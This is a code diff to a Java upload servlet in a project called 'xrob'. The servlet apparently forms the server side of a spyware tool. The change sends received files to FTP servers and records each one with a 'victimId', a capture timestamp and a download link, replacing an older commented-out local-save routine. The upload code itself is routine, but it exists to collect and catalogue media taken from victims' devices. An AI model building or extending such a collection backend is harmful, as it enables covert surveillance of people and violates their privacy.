@@ -2,8 +2,10 @@ package com.theah64.xrob.api.servlets;
 
 import com.theah64.xrob.api.database.tables.Deliveries;
 import com.theah64.xrob.api.database.tables.FTPServers;
+import com.theah64.xrob.api.database.tables.Media;
 import com.theah64.xrob.api.models.Delivery;
 import com.theah64.xrob.api.models.FTPServer;
+import com.theah64.xrob.api.models.MediaNode;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.FilePart;
 import org.apache.commons.net.ftp.FTPClient;
@@ -14,10 +16,7 @@ import javax.servlet.annotation.WebServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.Part;
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
 
 /**
  * Created by theapache64 on 11/18/2015,12:10 AM.
@@ -43,6 +42,7 @@ public class FileUploadServlet extends AdvancedBaseServlet {
     protected String[] getRequiredParameters() {
         return new String[]{KEY_ERROR, // To track if the delivery has any error
                 KEY_DATA_TYPE, //Data type of the file
+                Media.COLUMN_CAPTURED_AT,
                 KEY_MESSAGE //To explain about the success or error
         };
     }
@@ -74,34 +74,9 @@ public class FileUploadServlet extends AdvancedBaseServlet {
                 if (dataFilePart != null) {
 
                     final String contentType = dataFilePart.getContentType();
-                    final String fileName = new FilePart(dataFilePart).getRandomFileName();
+                    final FilePart filePart = new FilePart(dataFilePart);
+                    final String fileName = filePart.getRandomFileName();
                     final long size = dataFilePart.getSize();
-
-                        /*//The data is binary, so instead of saving the data to the database, we're saving the file into it's specific folder.
-                        final String dataStoragePath = deliveryType.getStoragePath();
-                        final File dataStorageDir = new File(dataStoragePath);
-
-                        if (!dataStorageDir.exists() && !dataStorageDir.mkdirs()) {
-
-                            throw new Exception("Failed to create upload directory : " + dataStorageDir.getAbsolutePath());
-
-                        } else {
-                            //The directory exists,so create the file
-                            final FileOutputStream fos = new FileOutputStream(deliveryType.getStoragePath() + File.separator + fileName);
-                            final InputStream is = dataFilePart.getInputStream();
-                            byte[] buffer = new byte[1024];
-                            int read;
-
-                            while ((read = is.read(buffer)) != -1) {
-                                fos.write(buffer, 0, read);
-                            }
-
-                            fos.flush();
-                            fos.close();
-                            is.close();
-                        }*/
-
-                    //TODO: Add the file details to the database
 
                     final FTPServer ftpServer = FTPServers.getInstance().getLeastUsedServer();
                     final FTPClient ftpClient = new FTPClient();
@@ -109,11 +84,21 @@ public class FileUploadServlet extends AdvancedBaseServlet {
                     ftpClient.connect(ftpServer.getFtpDomain());
                     ftpClient.login(ftpServer.getFtpUsername(), ftpServer.getFtpPassword());
 
+                    System.out.println("File uploading...");
+
                     ftpClient.storeFile("/public_html/" + fileName, dataFilePart.getInputStream());
+
+                    final String downloadLink = String.format("http://%s%s", ftpServer.getFtpDomain(), fileName);
+
+                    System.out.println("File uploaded");
+
+                    final long capturedAt = getLongParameter(Media.COLUMN_CAPTURED_AT);
+                    Media.getInstance().add(new MediaNode(victimId, filePart.getRealFileName(), dataType, ftpServer.getId(), downloadLink, size, capturedAt));
+
                     ftpClient.logout();
 
                     //Success message
-                    getWriter().write(new APIResponse("File uploaded", null).getResponse());
+                    getWriter().write(new APIResponse("File uploaded", Media.COLUMN_DOWNLOAD_LINK, downloadLink).getResponse());
 
 
                 } else {
@@ -135,25 +120,5 @@ public class FileUploadServlet extends AdvancedBaseServlet {
         }
 
     }
-
-    /**
-     * @param inputStream is
-     * @return text content
-     * @throws IOException
-     */
-    private String getFileContents(final InputStream inputStream) throws IOException {
-        final InputStreamReader isr = new InputStreamReader(inputStream);
-        final BufferedReader br = new BufferedReader(isr);
-        final StringBuilder fileContents = new StringBuilder();
-        String line;
-        while ((line = br.readLine()) != null) {
-            fileContents.append(line);
-        }
-        inputStream.close();
-        isr.close();
-        br.close();
-        return fileContents.toString();
-    }
-
 
 }
